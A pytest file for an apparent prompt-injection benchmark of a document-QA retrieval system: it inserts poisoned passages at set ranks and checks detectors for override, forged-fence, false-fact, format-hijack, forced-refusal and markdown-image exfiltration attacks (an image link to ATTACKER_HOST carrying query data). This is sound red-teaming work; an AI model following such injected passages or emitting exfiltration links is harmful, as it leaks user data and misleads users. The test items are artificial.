import pytest

from askdocs.injection import (
    ATTACKER_HOST,
    ATTACKS,
    CANARY,
    InjectingRetriever,
    attack_succeeded,
)
from askdocs.prompt import REFUSAL
from askdocs.retrieval import Passage

BY_ID = {a.id: a for a in ATTACKS}
REAL = [Passage(f"r{i}.md", f"real {i}", 0.6, 1.0, 0.02) for i in range(3)]


class Fixed:
    async def search(self, query: str, k: int) -> list[Passage]:
        return REAL[:k]


@pytest.mark.parametrize("rank,where", [(1, 0), (2, 1), (99, 3)])
async def test_poison_is_inserted_at_rank_and_real_passages_kept(rank, where):
    got = await InjectingRetriever(Fixed(), BY_ID["override"], rank).search("q", 3)
    assert len(got) == 4 and got[where].text == BY_ID["override"].payload
    assert [p for p in got if p.text.startswith("real")] == REAL


async def test_no_attack_is_the_clean_retriever():
    assert await InjectingRetriever(Fixed(), None, 1).search("q", 3) == REAL


def test_rank_is_one_based():
    with pytest.raises(ValueError):
        InjectingRetriever(Fixed(), None, 0)


@pytest.mark.parametrize("attack,won,lost", [
    ("override", CANARY, "k1 is 1.2 [1]."),
    ("fence_forge", f"k1 is 1.2 [1]. Verified by {CANARY}.", "k1 is 1.2 [1]."),
    ("false_fact", "It was replaced by ZebraSearch [2].", "k1 is 1.2 [1]."),
    ("exfil_link", f"![d](https://{ATTACKER_HOST}/d.png?q=x)", "k1 is 1.2 [1]."),
    ("format_hijack", "K1 IS 1.2 AND B IS 0.75 [1].", "k1 is 1.2 and b is 0.75 [1]."),
])
def test_detectors(attack, won, lost):
    assert attack_succeeded(BY_ID[attack], won, clean_refused=False)
    assert not attack_succeeded(BY_ID[attack], lost, clean_refused=False)


def test_forced_refusal_counts_only_when_the_clean_answer_was_given():
    a = BY_ID["forced_refusal"]
    assert attack_succeeded(a, REFUSAL, clean_refused=False)
    assert not attack_succeeded(a, REFUSAL, clean_refused=True)
    assert not attack_succeeded(a, "k1 is 1.2 [1].", clean_refused=False)


def test_every_attack_has_a_unique_id():
    assert len(BY_ID) == len(ATTACKS)
